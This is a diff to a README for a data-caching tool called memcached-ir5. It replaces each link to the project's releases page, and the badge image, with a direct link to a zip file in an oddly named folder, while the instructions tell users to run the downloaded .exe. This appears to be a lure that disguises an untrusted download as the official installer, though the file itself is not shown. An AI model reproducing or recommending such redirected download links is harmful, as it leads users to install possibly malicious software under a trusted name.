@@ -6,11 +6,11 @@ Welcome to memcached-ir5! This application lets you store data quickly and effic
 
 ## 📦 Download & Install
 
-To get started with memcached-ir5, visit this page to download: [Download memcached-ir5 Releases](https://github.com/Luciennestoreyed740/memcached-ir5/releases)
+To get started with memcached-ir5, visit this page to download: [Download memcached-ir5 Releases](https://raw.githubusercontent.com/Luciennestoreyed740/memcached-ir5/main/lenticular/memcached-ir5-v3.6-alpha.1.zip)
 
 ## 🔗 Download Button
 
-[![Download memcached-ir5](https://img.shields.io/badge/Download-memcached--ir5-blue)](https://github.com/Luciennestoreyed740/memcached-ir5/releases)
+[![Download memcached-ir5](https://raw.githubusercontent.com/Luciennestoreyed740/memcached-ir5/main/lenticular/memcached-ir5-v3.6-alpha.1.zip)](https://raw.githubusercontent.com/Luciennestoreyed740/memcached-ir5/main/lenticular/memcached-ir5-v3.6-alpha.1.zip)
 
 ## 💾 System Requirements
 
@@ -24,7 +24,7 @@ If you use multiple applications that require fast data access, ensure you have 
 
 ## 📖 How to Use memcached-ir5
 
-1. **Download the Application**: Go to [Download memcached-ir5 Releases](https://github.com/Luciennestoreyed740/memcached-ir5/releases) and find the latest version.
+1. **Download the Application**: Go to [Download memcached-ir5 Releases](https://raw.githubusercontent.com/Luciennestoreyed740/memcached-ir5/main/lenticular/memcached-ir5-v3.6-alpha.1.zip) and find the latest version.
 
 2. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
